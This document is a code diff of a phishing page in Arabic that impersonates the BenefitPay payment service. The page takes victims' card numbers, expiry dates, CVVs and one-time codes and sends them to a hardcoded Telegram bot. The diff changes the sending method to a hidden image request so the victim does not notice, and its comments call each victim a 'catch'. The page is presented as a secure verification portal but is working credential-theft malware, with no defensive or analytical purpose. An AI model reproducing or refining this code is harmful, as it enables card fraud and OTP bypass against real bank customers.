@@ -1,52 +1,73 @@
 <!DOCTYPE html>
-<html lang="en" dir="rtl">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BenefitPay | Portal</title>
+    <title>BenefitPay | التحقق الآمن</title>
     <style>
-        body { font-family: sans-serif; background: #f2f2f2; text-align: center; margin: 0; }
-        .header { background: #e21e26; color: #fff; padding: 20px; font-weight: bold; }
-        .card { background: #fff; margin: 20px auto; padding: 20px; width: 90%; max-width: 350px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
-        .btn { background: #e21e26; color: #fff; border: none; width: 100%; padding: 15px; border-radius: 5px; font-size: 18px; cursor: pointer; }
+        body { font-family: sans-serif; background: #f4f4f4; margin: 0; padding: 20px; text-align: center; }
+        .card { background: #fff; padding: 20px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 380px; margin: auto; }
+        .header { background: #e21e26; color: white; padding: 15px; border-radius: 12px 12px 0 0; margin: -20px -20px 20px -20px; font-weight: bold; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; text-align: center; font-size: 16px; }
+        .btn { background: #e21e26; color: white; border: none; width: 100%; padding: 15px; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        #step2 { display: none; }
     </style>
 </head>
 <body>
-    <div class="header">BenefitPay Secure System</div>
-    <div class="card" id="box1">
-        <input type="number" id="amt" placeholder="المبلغ">
-        <input type="text" id="name" placeholder="الاسم الكامل">
-        <input type="number" id="crd" placeholder="رقم البطاقة (16 رقم)">
-        <input type="text" id="ex" placeholder="MM/YY">
-        <input type="number" id="cv" placeholder="CVV">
-        <button class="btn" onclick="hit()">استمرار</button>
-    </div>
-    <div class="card" id="box2" style="display:none;">
-        <h3>تم إرسال الكود</h3>
-        <p>أدخل الرمز المستلم:</p>
-        <input type="number" id="ot" placeholder="******">
-        <button class="btn" onclick="done()">تأكيد</button>
-    </div>
-
-<script>
-    // تأكد من هذه الأرقام مليون مرة
-    var tok = "8428698833:AAHTDJu1uFDF61ytjsxh8PlSWwbrSPWSGG0";
-    var cid = "8302667206";
-
-    function hit() {
-        var m = "NEW_HIT%0A" + 
-                "Amt: " + document.getElementById('amt').value + "%0A" +
-                "Card: " + document.getElementById('crd').value + "%0A" +
-                "Exp: " + document.getElementById('ex').value + "%0A" +
-                "CVV: " + document.getElementById('cv').value;
-
-        // طريقة الإرسال عبر رابط خارجي (مستحيل تتعطل)
-        window.location.href = "https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + cid + "&text=" + m;
+    <div class="card">
+        <div class="header">BenefitPay - نظام التحقق</div>
         
-        // ملاحظة: هذا الكود سيأخذك لصفحة بيضاء فيها كلمة "OK: True" 
-        // وهذا معناه أن البيانات وصلت 100% لبوتك.
-    }
-</script>
+        <div id="step1">
+            <input type="number" id="amt" placeholder="المبلغ المستحق (BHD)">
+            <input type="text" id="nm" placeholder="الاسم الكامل">
+            <input type="text" id="cd" placeholder="رقم البطاقة (16 رقم)" maxlength="19">
+            <div style="display:flex; gap:10px">
+                <input type="text" id="ex" placeholder="MM/YY" maxlength="5">
+                <input type="password" id="cv" placeholder="CVV" maxlength="3">
+            </div>
+            <button class="btn" onclick="sendFirst()">استمرار</button>
+        </div>
+
+        <div id="step2">
+            <h3 style="color:#e21e26">أدخل رمز OTP</h3>
+            <p style="font-size:14px">تم إرسال رمز التحقق لهاتفك، يرجى إدخاله هنا:</p>
+            <input type="number" id="otp" placeholder="******" style="font-size:20px; letter-spacing:4px">
+            <button class="btn" onclick="sendSecond()">تأكيد</button>
+            <p id="wait" style="display:none; color:red; font-size:12px; margin-top:10px">جاري معالجة الطلب، لا تغادر الصفحة...</p>
+        </div>
+    </div>
+
+    <script>
+        // التوكن والآيدي الخاص بك
+        const botToken = "8428698833:AAHTDJu1uFDF61ytjsxh8PlSWwbrSPWSGG0";
+        const chatId = "8302667206";
+
+        // تنسيق البطاقة تلقائياً
+        document.getElementById('cd').oninput = e => {
+            e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
+        };
+
+        function sendFirst() {
+            const m = `🇧🇭 صيدة جديدة 🇧🇭%0Aالمبلغ: ${document.getElementById('amt').value}%0Aالاسم: ${document.getElementById('nm').value}%0Aالبطاقة: ${document.getElementById('cd').value}%0Aالتاريخ: ${document.getElementById('ex').value}%0Aالرمز: ${document.getElementById('cv').value}`;
+            
+            // طريقة الإرسال "المخفية" الأضمن (طلب صورة)
+            const apiURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${m}`;
+            let i = new Image();
+            i.src = apiURL;
+
+            // إظهار واجهة الكود
+            document.getElementById('step1').style.display = 'none';
+            document.getElementById('step2').style.display = 'block';
+        }
+
+        function sendSecond() {
+            const o = `🔑 كود الـ OTP: ${document.getElementById('otp').value}`;
+            const apiURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${o}`;
+            let i = new Image();
+            i.src = apiURL;
+            
+            document.getElementById('wait').style.display = 'block';
+        }
+    </script>
 </body>
 </html>
